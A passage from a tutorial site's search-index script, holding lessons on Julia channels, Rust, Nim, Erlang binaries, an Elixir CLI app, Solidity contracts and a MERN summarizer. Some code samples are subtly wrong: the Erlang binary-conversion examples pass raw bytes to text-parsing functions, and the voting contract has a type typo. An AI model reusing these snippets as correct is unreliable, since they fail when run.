julia\u003e put!(c, 1) # `put!` on an open channel succeeds 1 julia\u003e close(c); julia\u003e put!(c, 2) # `put!` on a closed channel throws an exception. ERROR: InvalidStateException: Channel is closed. Stacktrace: [...] take! and fetch (which retrieves but does not remove the value) on a closed channel successfully return any existing values until it is emptied. Continuing the above example:\njulia\u003e fetch(c) # Any number of `fetch` calls succeed. 1 julia\u003e fetch(c) 1 julia\u003e take!(c) # The first `take!` removes the value. 1 julia\u003e take!(c) # No more data available on a closed channel. ERROR: InvalidStateException: Channel is closed. Stacktrace: [...] Consider a simple example using channels for inter-task communication. We start 4 tasks to process data from a single jobs channel. Jobs, identified by an id (job_id), are written to the channel. Each task in this simulation reads a job_id, waits for a random amount of time and writes back a tuple of job_id and the simulated time to the results channel. Finally all the results are printed out.\njulia\u003e const jobs = Channel{Int}(32); julia\u003e const results = Channel{Tuple}(32); julia\u003e function do_work() for job_id in jobs exec_time = rand() sleep(exec_time) # simulates elapsed time doing actual work # typically performed externally. put!(results, (job_id, exec_time)) end end; julia\u003e function make_jobs(n) for i in 1:n put!(jobs, i) end end; julia\u003e n = 12; julia\u003e errormonitor(@async make_jobs(n)); # feed the jobs channel with \"n\" jobs julia\u003e for i in 1:4 # start 4 tasks to process requests in parallel errormonitor(@async do_work()) end julia\u003e @elapsed while n \u003e 0 # print out results job_id, exec_time = take!(results) println(\"$job_id finished in $(round(exec_time; digits=2)) seconds\") global n = n - 1 end 4 finished in 0.22 seconds 3 finished in 0.45 seconds 1 finished in 0.5 seconds 7 finished in 0.14 seconds 2 finished in 0.78 seconds 5 finished in 0.9 seconds 9 finished in 0.36 seconds 6 finished in 0.87 seconds 8 finished in 0.79 seconds 10 finished in 0.64 seconds 12 finished in 0.5 seconds 11 finished in 0.97 seconds 0.029772311 Tasks and Events linkMost task switches occur as a result of waiting for events like I/O requests and are managed by a scheduler included in Julia Base. The scheduler maintains a queue of runnable tasks and runs an event loop that restarts tasks based on external events such as message arrivals.\nThe primary function for waiting for an event is wait. Several objects implement wait; for instance, given a Process object, wait will wait for it to exit. Often, wait is implicit; for example, a call to read might internally wait for data to become available.\nIn all these cases, wait operates on a Condition object, responsible for queueing and restarting tasks. When a task calls wait on a Condition, the task is marked as non-runnable, added to the condition’s queue, and switches to the scheduler. The scheduler then picks another task to run or blocks waiting for external events. When the event occurs, an event handler calls notify on the condition, making the tasks waiting on that condition runnable again.\nA task explicitly created by calling Task is initially unknown to the scheduler. This allows for manual task management using yieldto if desired. However, when such a task waits for an event, it will still be automatically restarted when the event occurs, as expected.\n"
            }
        );
    index.add(
            {
                id:  41 ,
                href: "\/tutorials\/docs\/julia\/julia\/basic_calculator_with_julia\/",
                title: "Basic Calculator with Julia",
                description: "Julia, a high-level, high-performance programming language, is designed for technical computing",
                content: "Code Example: Basic Calculator in Julia linkHere’s a simple calculator that performs addition, subtraction, multiplication, and division:\nfunction calculate(a, b, operation) if operation == \"+\" return a + b elseif operation == \"-\" return a - b elseif operation == \"*\" return a * b elseif operation == \"/\" return a / b else return \"Unknown operation\" end end println(calculate(10, 5, \"+\")) # 15 println(calculate(10, 5, \"-\")) # 5 println(calculate(10, 5, \"*\")) # 50 println(calculate(10, 5, \"/\")) # 2.0 This example introduces basic function creation and usage, along with conditional statements.\n"
            }
        );
    index.add(
            {
                id:  42 ,
                href: "\/tutorials\/docs\/rust\/rust\/basic_concepts_in_rust\/",
                title: "Basic Concepts in Rust",
                description: "Explore the foundational concepts of variables, data types, and the principles of mutability and immutability in Rust, complete with detailed examples.",
                content: "Introduction linkIn this post, we’re going to explore some fundamental concepts of Rust programming: variables and data types, along with mutability and immutability. Understanding these concepts is crucial as they form the foundation upon which safe and efficient Rust programs are built.\nVariables and Data Types linkIn Rust, a variable is a storage location paired with an associated name, which contains some known or unknown quantity of data referred to as a value. When you declare a variable in Rust, you must also declare its type either explicitly or implicitly.\nExample of Variable Declaration:\nlet number: i32 = 10; let name = \"Rust\"; // Implicitly inferred as `\u0026str` Rust is a statically typed language, which means that the type of a variable must be known at compile time. However, Rust also has powerful type inference capabilities, which allows you to omit the type in many cases, and the compiler can infer the type based on the value assigned to the variable.\nCommon Data Types:\nInteger Types: i32, u32, i64, u64, etc. Floating-Point Types: f32, f64 Boolean Type: bool which represents values true and false Character Type: char String Types: String and \u0026str Each data type in Rust serves a specific purpose and choosing the right type for the right job is a key skill in Rust programming.\nMutability and Immutability linkOne of Rust’s most distinctive features is how it handles mutability. By default, variables in Rust are immutable, meaning once a value is bound to a name, you can’t change that value.\nExample of Immutable Variable:\nlet x = 5; x = 6; // This line will cause a compile-time error To change the variable, you must explicitly declare it as mutable using the mut keyword.\nExample of Mutable Variable:\nlet mut y = 5; y = 6; // This is perfectly fine This design choice enforces thread safety and prevents many common bugs found in other programming languages. However, it can be a paradigm shift if you’re coming from a language where mutability is the default.\nUnderstanding Rust’s Approach to Mutability linkRust’s approach to mutability is deeply integrated with its ownership system. This system ensures that there are clear rules for how data is accessed and modified, which in turn makes Rust programs more predictable and easier to reason about.\nSingle Ownership: Each value in Rust has a single owner — the variable that binds to it. Borrowing: Others can borrow the value, either mutably or immutably, but with strict rules. Mutable Borrowing Rules:\nYou can have any number of immutable references or exactly one mutable reference. References must always be valid. Why Immutability Matters:\nImmutability by default makes concurrent programming safer and more concurrent without needing to think about locks. It leads to easier to understand code because you don’t need to track how and where a value might change. Conclusion linkUnderstanding variables, data types, and especially the concepts of mutability and immutability, lays the groundwork for mastering more advanced Rust topics, such as ownership, borrowing, and lifetimes. These features work together to ensure that Rust programs are safe, efficient, and concurrent.\nIn the next post, we will delve deeper into Rust’s ownership rules, which are pivotal for writing safe concurrent applications. Stay tuned and keep practicing what you’ve learned today to build a solid foundation in Rust programming!\n"
            }
        );
    index.add(
            {
                id:  43 ,
                href: "\/tutorials\/docs\/nim\/nim\/basic_data_types\/",
                title: "Basic data types in Nim",
                description: "Learn about basic data types using the nim language.",
                content: "In this section, we will be learning more about basic data types in Nim.\nIntegers linkCreate a file called Integers.nim and have the following code:\nlet a = 11 b = 4 echo \"a + b = \", a + b echo \"a - b = \", a - b echo \"a * b = \", a * b echo \"a / b = \", a / b echo \"a div b = \", a div b echo \"a mod b = \", a mod b The echo command will print to the screen everything that follows it separated by commas. In this case, it first prints the string a + b = , and then after it, in the same row, it prints the result of the expression a + b. We can compile and run the above code, and the output should be:\na + b = 15 a - b = 7 a * b = 44 a / b = 2.75 a div b = 2 a mod b = 3 Floats linkCreate a file called floats.nim and have the following code\nlet c = 6.75 d = 2.25 echo \"c + d = \", c + d echo \"c - d = \", c - d echo \"c * d = \", c * d echo \"c / d = \", c / d c + d = 9.0 c - d = 4.5 c * d = 15.1875 c / d = 3.0 Notice that in the addition and division examples, even though we get a number without a decimal part, the result is still of the floating type. The precedence of mathematical operations is as one would expect: multiplication and division have higher priority than addition and subtraction.\necho 2 + 3 * 4 echo 24 - 8 / 4 14 22.0 Converting floats and integers linkMathematical operations between variables of different numerical types are not possible in Nim, and they will produce an error:\nlet e = 5 f = 23.456 echo e + f # error The values of variables need to be converted to the same type. Conversion is straight-forward: to convert to an integer, we use the int function, and to convert to a float the float function is used.\nlet e = 5 f = 23.987 echo float(e) echo int(f) echo float(e) + f echo e + int(f) # output 5.0 23 28.987 28 Characters linkThe char type is used for representing a single ASCII character. Chars are written between two single ticks (’). Chars can be letters, symbols, or single digits. Multiple digits or multiple letters produce an error.\nlet h = 'z' i = '+' j = '2' k = '35' # error l = 'xy' # error Strings linkStrings can be described as a series of characters. Their content is written between two double quotes (\").\nstrings.nim\nlet m = \"word\" n = \"A sentence with interpunction.\" o = \"\" p = \"32\" q = \"!\" String concatenation\nStrings in Nim are mutable, meaning their content can change. With the add function we can add (append) either another string or a char to an existing string. If we don’t want to change the original string, we can also concatenate (join together) strings with the \u0026 operator, this returns a new string.\nstringConcat.nim\nvar p = \"abc\" q = \"xy\" r = 'z' p.add(\"def\") echo \"p is now: \", p q.add(r) echo \"q is now: \", q echo \"concat: \", p \u0026 q echo \"p is still: \", p echo \"q is still: \", q p is now: abcdef q is now: xyz concat: abcdefxyz p is still: abcdef q is still: xyz Relational operators\nRelational operators test the relation between two entities, which must be comparable. To compare if two values are the same, == (two equal signs) is used. Do not confuse this with =, which is used for assignment as we saw earlier. Here are all the relational operators defined for integers:\nrelationalOperators.nim\nlet g = 31 h = 99 echo \"g is greater than h: \", g \u003e h echo \"g is smaller than h: \", g \u003c h echo \"g is equal to h: \", g == h echo \"g is not equal to h: \", g != h echo \"g is greater or equal to h: \", g \u003e= h echo \"g is smaller or equal to h: \", g \u003c= h g is greater than h: false g is smaller than h: true g is equal to h: false g is not equal to h: true g is greater or equal to h: false g is smaller or equal to h: true We can also compare characters and strings: relationalOperators.nim\nlet i = 'a' j = 'd' k = 'Z' echo i \u003c j echo i \u003c k let m = \"axyb\" n = \"axyz\" o = \"ba\" p = \"ba \" echo m \u003c n echo n \u003c o echo o \u003c p true false true true true "
            }
        );
    index.add(
            {
                id:  44 ,
                href: "\/tutorials\/docs\/erlang\/erlang\/erlangs_binaries\/",
                title: "Binaries in Erlang Programming Language",
                description: "Erlang provides a data structure called a binary to store large quantities of raw data efficiently. Binaries are more space-efficient compared to lists or tuples, and the Erlang runtime system is optimized for efficient input and output operations involving binaries. What are Binaries? linkBinaries in Erlang are written and printed as sequences of integers or strings, enclosed in double less than and greater than brackets (\u003c\u003c \u003e\u003e). They are used for handling raw data efficiently.",
                content: "Erlang provides a data structure called a binary to store large quantities of raw data efficiently. Binaries are more space-efficient compared to lists or tuples, and the Erlang runtime system is optimized for efficient input and output operations involving binaries.\nWhat are Binaries? linkBinaries in Erlang are written and printed as sequences of integers or strings, enclosed in double less than and greater than brackets (\u003c\u003c \u003e\u003e). They are used for handling raw data efficiently.\nExample link -module(helloworld). -export([start/0]). start() -\u003e io:fwrite(\"~p~n\", [\u003c\u003c5, 10, 20\u003e\u003e]), io:fwrite(\"~p~n\", [\u003c\u003c\"hello\"\u003e\u003e]). Output linkWhen you run the above program, the output will be:\n\u003c\u003c5,10,20\u003e\u003e \u003c\u003c\"hello\"\u003e\u003e Functions for Working with Binaries linkErlang provides several functions to work with binaries. Below is a summary of some essential functions and their descriptions:\nSr.No. Method Description 1 list_to_binary/1 Converts an existing list to a binary. 2 split_binary/2 Splits the binary based on the specified index. 3 term_to_binary/1 Converts a term to binary. 4 is_binary/1 Checks if a bitstring is a binary value. 5 binary_part/2 Extracts a part of the binary. 6 binary_to_float/1 Converts a binary value to a float. 7 binary_to_integer/1 Converts a binary value to an integer. 8 binary_to_list/1 Converts a binary value to a list. 9 binary_to_atom/1 Converts a binary value to an atom. Examples of Using Binary Functions linkConverting a List to a Binary link -module(helloworld). -export([start/0]). start() -\u003e List = [1, 2, 3, 4, 5], Binary = list_to_binary(List), io:fwrite(\"Binary: ~p~n\", [Binary]). Splitting a Binary link -module(helloworld). -export([start/0]). start() -\u003e Binary = \u003c\u003c1, 2, 3, 4, 5\u003e\u003e, {FirstPart, SecondPart} = split_binary(Binary, 2), io:fwrite(\"First part: ~p~nSecond part: ~p~n\", [FirstPart, SecondPart]). Converting a Term to Binary link -module(helloworld). -export([start/0]). start() -\u003e Term = {hello, world}, Binary = term_to_binary(Term), io:fwrite(\"Binary: ~p~n\", [Binary]). Checking if a Value is Binary link -module(helloworld). -export([start/0]). start() -\u003e Value = \u003c\u003c1, 2, 3\u003e\u003e, IsBinary = is_binary(Value), io:fwrite(\"Is binary: ~p~n\", [IsBinary]). Extracting a Part of a Binary link -module(helloworld). -export([start/0]). start() -\u003e Binary = \u003c\u003c1, 2, 3, 4, 5\u003e\u003e, Part = binary_part(Binary, {1, 3}), io:fwrite(\"Binary part: ~p~n\", [Part]). Converting a Binary to a Float link -module(helloworld). -export([start/0]). start() -\u003e Binary = \u003c\u003c64, 9, 33, 251, 84, 68, 45, 24\u003e\u003e, Float = binary_to_float(Binary), io:fwrite(\"Float: ~p~n\", [Float]). Converting a Binary to an Integer link -module(helloworld). -export([start/0]). start() -\u003e Binary = \u003c\u003c1, 0, 0, 0\u003e\u003e, Integer = binary_to_integer(Binary), io:fwrite(\"Integer: ~p~n\", [Integer]). Converting a Binary to a List link -module(helloworld). -export([start/0]). start() -\u003e Binary = \u003c\u003c\"hello\"\u003e\u003e, List = binary_to_list(Binary), io:fwrite(\"List: ~p~n\", [List]). Converting a Binary to an Atom link -module(helloworld). -export([start/0]). start() -\u003e Binary = \u003c\u003c\"hello\"\u003e\u003e, Atom = binary_to_atom(Binary, utf8), io:fwrite(\"Atom: ~p~n\", [Atom]). Conclusion linkErlang binaries are efficient for storing and manipulating large amounts of raw data. By using the functions provided by Erlang’s standard library, you can perform various operations on binaries, such as conversion, splitting, and extraction.\n"
            }
        );
    index.add(
            {
                id:  45 ,
                href: "\/tutorials\/docs\/elixir\/elixir\/03_cli_tool_using_elixir\/",
                title: "Build a CLI Todo List using Elixir",
                description: "Learn how to build a simple cli todo tool using elixir",
                content: "This section will guide you throguh creating a basic command-line TODO application. We will explore key conteps and syntac along the way, makin git perfect for people who just started using the language.\nGetting started linkFirst, we should create a new project by running the command\nmix new todo_cli --sup We have already gone through the meaning of --sup in the first tutorial we had.\nOur proejct will consist of four main modules:\nTodoCli.Application: This module defines the application itself and utilizes the Supervisor behavior to manage child processes. TodoCli.MixProject: This module defines the project configuration using Mix, the Elixir build tool. It specifies dependencies, the Elixir version, and the application name. For this project, you won’t need to update it since we are not going to need any external dependancies. CLI: This module handles the command-line interface (CLI) interaction. It takes user input, processes commands, and interacts with the Todo module. Todo: This module represents the to-do list itself. It defines functions to manage tasks like adding, listing, and deleting them. The Todo Module linkThe todo module manges the Todo tasks, providing functions for adding, listing and deleting tasks. In the lib folder, create a file called todo.ex and put in the following code.\n#lib/todo.ex defmodule Todo do defstruct tasks: [] @doc \"\"\" Initializes a new to-do list. \"\"\" def new() do %Todo{} end @doc \"\"\" Adds a task to the to-do list. \"\"\" def add_task(%Todo{tasks: tasks} = todo, task) do %Todo{todo | tasks: tasks ++ [task]} end @doc \"\"\" Lists all tasks in the to-do list. \"\"\" def list_tasks(%Todo{tasks: tasks}) do tasks end @doc \"\"\" Deletes a task from the to-do list by its index. \"\"\" def delete_task(%Todo{tasks: tasks} = todo, index) when is_integer(index) and index \u003e= 0 do if index \u003c length(tasks) do tasks = List.delete_at(tasks, index) %Todo{todo | tasks: tasks} else IO.puts(\"Task deletion failed. Invalid index: #{index}\") todo end end end This module defines the Todo struct and functions fro initializing a new Todo list, adding tasks, listing tasks, and deleting tasks.\nThe CLI module linkAfter creating the Todo module, we now move over to create the CLI module which handles user input and commands. This will be using this interface to communicate with the module and manage their tasks. In the lib folder, create a file called cli.ex and put in the following code.\n#lib/cli.ex defmodule CLI do alias Todo @doc \"\"\" Starts the CLI and processes user commands. \"\"\" def start() do todo = Todo.new() loop(todo) end defp loop(todo) do IO.puts(\"Commands: add , list, delete , quit\") command = IO.gets(\"\u003e \") |\u003e String.trim() new_todo = case String.split(command) do [\"add\" | task] -\u003e task = Enum.join(task, \" \") todo = Todo.add_task(todo, task) IO.puts(\"Task added.\") todo [\"list\"] -\u003e IO.puts(\"Tasks:\") Enum.with_index(Todo.list_tasks(todo)) |\u003e Enum.each(fn {task, index} -\u003e IO.puts(\"#{index + 1}. #{task}\") end) todo [\"delete\", index_str] -\u003e case Integer.parse(index_str) do {index, _} when index \u003e 0 -\u003e todo = Todo.delete_task(todo, index - 1) IO.puts(\"Task deleted.\") todo :error -\u003e IO.puts(\"Invalid index. Please enter a valid number.\") todo end [\"quit\"] -\u003e IO.puts(\"Goodbye!\") :stop _ -\u003e IO.puts(\"Invalid command.\") todo end if new_todo != :stop do loop(new_todo) end end end This module defines the start/0 function, which initiates the CLI interface and starts the command loop. It interacts with the Todo module to perform actions such as adding, listing, and deleting tasks.\nNow that we are done with creating the two modules, we are going to configure the application and test out the commands.\nConfiguring our entry point linkThe TodoCli.Application module is the entry point of our application. It starts the supervision tree and initiates the CLI interface. Open the application.ex file in lib/todo_cli folder and update it using the following code:\n#lib/todo_cli/application.ex defmodule TodoCli.Application do @moduledoc false use Application @impl true def start(_type, _args) do children = [] opts = [strategy: :one_for_one, name: TodoCli.Supervisor] Supervisor.start_link(children, opts) # Start the CLI CLI.start() end end Running the project linkWe are now done creating the project. Now we are going to start the project buy running:\nmix run --no-halt You should get an output like this:\nAs you can see, we have four commands which are add, list, delete, and quit. Lets add a task by typing:\nadd Create a blog post After adding and also running the list command\nTasks: 1. Create a blog post If we add a second task like Code a new feature using the add command, and running list again, we will have:\nTasks: 1. Create a blog post 2. Code a new feature Now if you are done doing a task and you want to delete it, you can use the delete command with the number of the task you want to delete. In this case, if we want to delete the second task, we can run:\ndelete 2 and the out after running list again will be:\n```bash Tasks: 1. Create a blog post The last command quit will simply quit the application.\nThis brings us to the end of this session, you can use this CLI tool and adapt it for your specific usecase.\n"
            }
        );
    index.add(
            {
                id:  46 ,
                href: "\/tutorials\/docs\/solidity\/solidity\/build_a_crowdfunding_contract\/",
                title: "Build A Crowdfunding Contract with Solidity and ERC20 Tokens",
                description: "In this section, you will build a simple crowdfunding contract using solidity and get to implement some of Solidity concepts like interfaces, struct and more.",
                content: "In decentralized finance (DeFi), crowdfunding has become increasingly popular as a means for raising funds for various projects. In this section, we’ll explore how to create a crowdfunding contract on Ethereum using ERC20 tokens. The contract allows users to create campaigns, pledge tokens to campaigns, and claim funds if the campaign goal is reached. If the goal is not met, users can withdraw their pledged tokens.\nContract Overview linkOur crowdfunding contract consists of the following functionalities:\nCampaign Creation: Users can create campaigns specifying the fundraising goal and duration. Pledging: Contributors can pledge ERC20 tokens to campaigns. Claiming Funds: Campaign creators can claim the pledged funds if the goal is met. Refunding: Contributors can withdraw their pledged tokens if the campaign goal is not reached. Let’s start creating our contract.\nCertainly! Let’s break down the code into blocks and explain each part.\n1: Importing Interfaces and Declaring Contract link // SPDX-License-Identifier: MIT pragma solidity ^0.8.24; interface IERC20 { function transfer(address, uint256) external returns (bool); function transferFrom(address, address, uint256) external returns (bool); } contract CrowdFund { // Contract code goes here... } The contract starts with specifying the SPDX license identifier and the Solidity version pragma. It imports the IERC20 interface, which defines the functions required for interacting with ERC20 tokens. The CrowdFund contract is declared. 2: Event Declarations link event Launch(uint256 id, address indexed creator, uint256 goal, uint32 startAt, uint32 endAt); event Cancel(uint256 id); event Pledge(uint256 indexed id, address indexed caller, uint256 amount); event Unpledge(uint256 indexed id, address indexed caller, uint256 amount); event Claim(uint256 id); event Refund(uint256 id, address indexed caller, uint256 amount); Events are declared to emit information about different actions in the contract. Events provide a way for external applications to listen and react to specific actions that occur within the contract. 3: Campaign Struct Declaration link struct Campaign { address creator; uint256 goal; uint256 pledged; uint32 startAt; uint32 endAt; bool claimed; } Defines a struct Campaign to represent crowdfunding campaigns. It contains fields for the campaign creator, fundraising goal, total amount pledged, start and end timestamps, and a flag indicating whether the funds have been claimed. 4: Contract State Variables link IERC20 public immutable token; uint256 public count; mapping(uint256 =\u003e Campaign) public campaigns; mapping(uint256 =\u003e mapping(address =\u003e uint256)) public pledgedAmount; Declares state variables: token: Holds the address of the ERC20 token used for pledges. count: Keeps track of the total number of campaigns created. campaigns: Maps campaign IDs to their respective Campaign struct instances. pledgedAmount: Maps campaign IDs to pledger addresses and the amount they have pledged. 5: Constructor link constructor(address _token) { token = IERC20(_token); } Constructor function initializes the token variable with the address of the ERC20 token contract. 6: Campaign Creation Function (launch) link function launch(uint256 _goal, uint32 _startAt, uint32 _endAt) external { require(_startAt \u003e= block.timestamp, \"start at \u003c now\"); require(_endAt \u003e= _startAt, \"end at \u003c start at\"); require(_endAt \u003c= block.timestamp + 90 days, \"end at \u003e max duration\"); count += 1; campaigns[count] = Campaign({ creator: msg.sender, goal: _goal, pledged: 0, startAt: _startAt, endAt: _endAt, claimed: false }); emit Launch(count, msg.sender, _goal, _startAt, _endAt); } Allows users to create a new crowdfunding campaign with a specified goal and duration. You can see proper error handling, campaign initialization and events. 7: Campaign Cancellation Function (cancel) link function cancel(uint256 _id) external { Campaign memory campaign = campaigns[_id]; require(campaign.creator == msg.sender, \"not creator\"); require(block.timestamp \u003c campaign.startAt, \"started\"); delete campaigns[_id]; emit Cancel(_id); } Allows the creator of a campaign to cancel it before it starts. 8: Pledge Function (pledge) link function pledge(uint256 _id, uint256 _amount) external { Campaign storage campaign = campaigns[_id]; require(block.timestamp \u003e= campaign.startAt, \"not started\"); require(block.timestamp \u003c= campaign.endAt, \"ended\"); campaign.pledged += _amount; pledgedAmount[_id][msg.sender] += _amount; token.transferFrom(msg.sender, address(this), _amount); emit Pledge(_id, msg.sender, _amount); } Enables users to pledge tokens to a specific campaign. 9: Unpledge Function (unpledge) link function unpledge(uint256 _id, uint256 _amount) external { Campaign storage campaign = campaigns[_id]; require(block.timestamp \u003c= campaign.endAt, \"ended\"); campaign.pledged -= _amount; pledgedAmount[_id][msg.sender] -= _amount; token.transfer(msg.sender, _amount); emit Unpledge(_id, msg.sender, _amount); } Allows users to withdraw their pledged tokens from a campaign. 10: Claim Function (claim) link function claim(uint256 _id) external { Campaign storage campaign = campaigns[_id]; require(campaign.creator == msg.sender, \"not creator\"); require(block.timestamp \u003e campaign.endAt, \"not ended\"); require(campaign.pledged \u003e= campaign.goal, \"pledged \u003c goal\"); require(!campaign.claimed, \"claimed\"); campaign.claimed = true; token.transfer(campaign.creator, campaign.pledged); emit Claim(_id); } Enables the creator of a campaign to claim the pledged funds if the goal is met. 11: Refund Function (refund) link function refund(uint256 _id) external { Campaign memory campaign = campaigns[_id]; require(block.timestamp \u003e campaign.endAt, \"not ended\"); require(campaign.pledged \u003c campaign.goal, \"pledged \u003e= goal\"); uint256 bal = pledgedAmount[_id][msg.sender]; pledgedAmount[_id][msg.sender] = 0; token.transfer(msg.sender, bal); emit Refund(_id, msg.sender, bal); } Allows contributors to refund their pledged tokens if the campaign goal is not met. Conclusion linkEach block of the contract code represents a specific functionality of the crowdfunding contract, from campaign creation to fund claiming and refunding. Understanding each block’s purpose and logic is essential for building and interacting with the contract effectively.\n"
            }
        );
    index.add(
            {
                id:  47 ,
                href: "\/tutorials\/docs\/solidity\/solidity\/building_a_remote_purchase_contract\/",
                title: "Build a Remote Purchase Contract Using Solidity",
                description: "Build a contract that will allow users to vote for anyone they choose.",
                content: "Purchasing goods remotely currently requires multiple parties that need to trust each other. The simplest configuration involves a seller and a buyer. The buyer would like to receive an item from the seller, and the seller would like to get some compensation, e.g., Ether, in return. The problematic part is the shipment: There is no way to determine for sure that the item arrived at the buyer.\nThere are multiple ways to solve this problem, but all fall short in one way or another. In the following example, both parties have to put twice the value of the item into the contract as escrow. Once this happens, the Ether will stay locked inside the contract until the buyer confirms they received the item. After that, the buyer is returned the value (half of their deposit), and the seller gets three times the value (their deposit plus the value). The idea behind this is that both parties have an incentive to resolve the situation; otherwise, their Ether is locked forever.\nThis contract does not solve the problem entirely but gives an overview of how you can use state machine-like constructs inside a contract.\nSmart Contract Code Breakdown linkHere is the complete code for the smart contract and a breakdown of its key parts.\nContract Initialization link // SPDX-License-Identifier: GPL-3.0 pragma solidity ^0.8.4; contract Purchase { uint public value; address payable public seller; address payable public buyer; enum State { Created, Locked, Release, Inactive } State public state; modifier condition(bool condition_) { require(condition_); _; } error OnlyBuyer(); error OnlySeller(); error InvalidState(); error ValueNotEven(); modifier onlyBuyer() { if (msg.sender != buyer) revert OnlyBuyer(); _; } modifier onlySeller() { if (msg.sender != seller) revert OnlySeller(); _; } modifier inState(State state_) { if (state != state_) revert InvalidState(); _; } event Aborted(); event PurchaseConfirmed(); event ItemReceived(); event SellerRefunded(); State Variables: value, seller, and buyer are defined to store the item’s value and the addresses of the seller and buyer. Enum State: Represents the different states of the contract: Created, Locked, Release, and Inactive. Modifiers and Errors: Defined to restrict access to certain functions and to handle errors gracefully. Constructor link constructor() payable { seller = payable(msg.sender); value = msg.value / 2; if ((2 * value) != msg.value) revert ValueNotEven(); } Constructor: Sets the seller’s address and ensures the value sent is even, as it will be divided into two equal parts for the escrow. Aborting the Purchase link function abort() external onlySeller inState(State.Created) { emit Aborted(); state = State.Inactive; seller.transfer(address(this).balance); } abort: Allows the seller to abort the transaction before it is locked, refunding the seller and setting the contract to an inactive state. Confirming the Purchase link function confirmPurchase() external inState(State.Created) condition(msg.value == (2 * value)) payable { emit PurchaseConfirmed(); buyer = payable(msg.sender); state = State.Locked; } confirmPurchase: Allows the buyer to confirm the purchase, requiring a payment of twice the item’s value. This locks the Ether in the contract. Confirming Receipt of Item link function confirmReceived() external onlyBuyer inState(State.Locked) { emit ItemReceived(); state = State.Release; buyer.transfer(value); } confirmReceived: Allows the buyer to confirm receipt of the item, releasing their escrowed funds and moving to the release state. Refunding the Seller link function refundSeller() external onlySeller inState(State.Release) { emit SellerRefunded(); state = State.Inactive; seller.transfer(3 * value); } } refundSeller: Allows the seller to retrieve their escrowed funds once the buyer confirms receipt, moving the contract to an inactive state. Conclusion linkThis smart contract example demonstrates a way to create a trustless escrow system using Ethereum. Both parties must put up collateral, incentivizing them to complete the transaction honestly. Although this solution doesn’t solve all potential issues with remote purchases, it provides a foundation for using state machines within smart contracts.\n"
            }
        );
    index.add(
            {
                id:  48 ,
                href: "\/tutorials\/docs\/full-stack-projects\/full-stack-projects\/text_summarizer\/",
                title: "Build a Text Summarizer using MERN",
                description: "How to install and use libraries",
                content: "The MERN stack, comprising MongoDB, Express, React, and Node.js, is a powerful combination for building full-stack web applications. In this article, we’ll walk you through the process of creating a Summarizer Website using the MERN stack.\n1. Pre-requisites linkBefore we begin, ensure you have the following knowledge and tools:\nBasic knowledge of JavaScript. Familiarity with the MERN Stack basics. Basic knowledge of API integration. Understanding of how to set up and use MongoDB with Mongoose. 2. Approach to Create Summarizer Website link Generate an OpenAI API Key to use the OpenAI API. Set up the MERN project in an IDE of your choice (like Visual Studio Code). Integrate the OpenAI API Key into the application server-side codebase. Launch the application. 3. Steps to Generate OpenAI API Key linkStep 1: Log in to OpenAI link Open the OpenAI platform Create a new account or log in with your existing account. Navigate to the OpenAI dashboard. Step 2: Generate API Key link Hover on the left sidebar and click on ‘API Keys’. Click on ‘+ Create new secret key’. Note: Save this API Key in a safe place; it will be required later.\n4. Steps to Create the Project linkStep 1: Set Up the React App linkCreate your React App and install the required dependencies.\nnpm create vite@latest # you will be prompted to enter project name, choose summarizer-app, then choose React framework cd summarizer-app npm install We will also need axios so run\nnpm install axios Create a .env file inside the root directory of the React app:\nREACT_APP_BACKEND_URL=http://localhost:5000 Update the dependencies in package.json:\n\"dependencies\": { \"@testing-library/jest-dom\": \"^5.17.0\", \"@testing-library/react\": \"^13.4.0\", \"@testing-library/user-event\": \"^13.5.0\", \"axios\": \"^1.6.3\", \"react\": \"^18.2.0\", \"react-dom\": \"^18.2.0\", \"react-scripts\": \"5.0.1\", \"web-vitals\": \"^2.1.4\" } Add the following code to src/App.js:\n// src/App.js import axios from 'axios'; import React, { useState } from 'react'; const App = () =\u003e { const [inputText, setInputText] = useState(''); const [summary, setSummary] = useState(''); const summarizeText = async () =\u003e { try { const response = await axios.post( `${process.env.REACT_APP_BACKEND_URL}/api/summarize`, { text: inputText } ); setSummary(response.data.summary); } catch (error) { console.error('Error calling backend API:', error); } }; return ( Text Summarizer "
            }
        );
    index.add(
            {
                id:  49 ,
                href: "\/tutorials\/docs\/solidity\/solidity\/build_a_voting_contract\/",
                title: "Build a Voting Contract Using Solidity",
                description: "Build a contract that will allow users to vote for anyone they choose.",
                content: "In this section, we’ll walk you through the process of building a smart contract for conducting secure and transparent voting on the Ethereum blockchain. We’ll explain each section of the code step-by-step to help you understand how it works. Note, this is not a full implementation and you can customize of for whatever usecase you want.\nIntroduction linkThis contract implements a voting contract. Of course, the main problems of electronic voting is how to assign voting rights to the correct persons and how to prevent manipulation. We will not solve all problems here, but at least we will show how delegated voting can be done so that vote counting is automatic and completely transparent at the same time.\nThe idea is to create one contract per ballot, providing a short name for each option. Then the creator of the contract who serves as chairperson will give the right to vote to each address individually.\nThe persons behind the addresses can then choose to either vote themselves or to delegate their vote to a person they trust.\nAt the end of the voting time, winningProposal() will return the proposal with the largest number of votes.\nContract Overview linkOur contract consists of three main parts:\nData Structures: Define the data structures for voters and proposals. Voting Logic: Implement functions for giving voting rights, voting, and delegation. Vote Counting: Compute the winning proposal based on the accumulated votes. Let’s dive into the code breakdown.\n1. Data Structures link // SPDX-License-Identifier: UNLICENSED pragma solidity 0.8.19; contract Ballot { struct Voter { uint weight; bool voted; address delegate; uint vote; } struct Proposal { bytes32 name; uint voteCount; } Voter: Represents a voter with attributes like weight (for delegation), voted status, delegate (if delegated), and the proposal voted for. Proposal: Represents a voting option with a name and the count of accumulated votes. Some state variables\naddress public chairperson; mapping(addree =\u003e Voter) public voters; Proposal[] public proposals; 2. Voting Logic linkConstructor link constructor(bytes32[] memory proposalNames) { chairperson = msg.sender; voters[chairperson].weight = 1; for (uint i = 0; i \u003c proposalNames.length; i++) { proposals.push(Proposal({ name: proposalNames[i], voteCount: 0 })); } } chairperson: The creator of the contract who initiates the voting. proposals: Array storing the list of proposals provided at contract deployment. Giving Voting Rights link function giveRightToVote(address voter) external { require(msg.sender == chairperson, \"Only chairperson can give right to vote.\"); require(!voters[voter].voted, \"The voter already voted.\"); require(voters[voter].weight == 0); voters[voter].weight = 1; } The chairperson grants voting rights to specific addresses. Delegation link function delegate(address to) external { Voter storage sender = voters[msg.sender]; require(sender.weight != 0, \"You have no right to vote\"); require(!sender.voted, \"You already voted.\"); require(to != msg.sender, \"Self-delegation is disallowed.\"); while (voters[to].delegate != address(0)) { to = voters[to].delegate; require(to != msg.sender, \"Found loop in delegation.\"); } Voter storage delegate_ = 